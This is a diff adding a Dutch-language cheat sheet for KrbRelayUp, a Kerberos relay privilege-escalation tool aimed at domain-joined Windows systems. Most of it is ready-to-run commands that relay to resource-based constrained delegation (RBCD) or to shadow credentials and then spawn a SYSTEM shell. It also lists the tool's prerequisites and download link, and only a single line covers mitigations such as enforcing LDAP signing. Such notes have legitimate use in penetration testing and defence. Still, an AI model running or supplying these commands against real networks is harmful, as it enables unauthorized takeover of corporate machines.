@@ -1,0 +1,30 @@
+# KrbRelayUp — Reflective Kerberos Relay (lokale privilege escalatie)
+# Combineert Kerberos relay met RBCD voor SYSTEM toegang
+# Werkt als lokale privilege escalatie op domain-joined systemen
+#
+# === Vereisten ===
+# - Lokale code-executie op een domain-joined systeem
+# - LDAP signing niet vereist (standaard)
+# - Machine account quota > 0 (standaard: 10)
+#
+# === Voorbeelden ===
+
+# Volledige aanval in één stap (relay + RBCD + S4U + service)
+.\KrbRelayUp.exe relay -d DOMAIN -dc DC_IP
+
+# Stap voor stap - Relay naar RBCD
+.\KrbRelayUp.exe relay -d DOMAIN -dc DC_IP -createnetonly
+
+# Met specifiek machine account
+.\KrbRelayUp.exe relay -d DOMAIN -dc DC_IP -m YOURCOMPUTER$ -p 'MACHINEPASS'
+
+# Spawn SYSTEM shell
+.\KrbRelayUp.exe spawn -d DOMAIN -dc DC_IP -m YOURCOMPUTER$ -p 'MACHINEPASS'
+
+# Via Shadow Credentials (alternatief voor RBCD)
+.\KrbRelayUp.exe relay -d DOMAIN -dc DC_IP -m YOURCOMPUTER$ -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED} -sc
+
+# Noot: Download: https://github.com/Dec0ne/KrbRelayUp
+# Noot: Werkt niet als LDAP signing is vereist
+# Noot: Machine account quota = 0 blokkeert de aanval (tenzij je al een machine account hebt)
+# Noot: Mitigatie: Enforce LDAP signing, set MachineAccountQuota=0
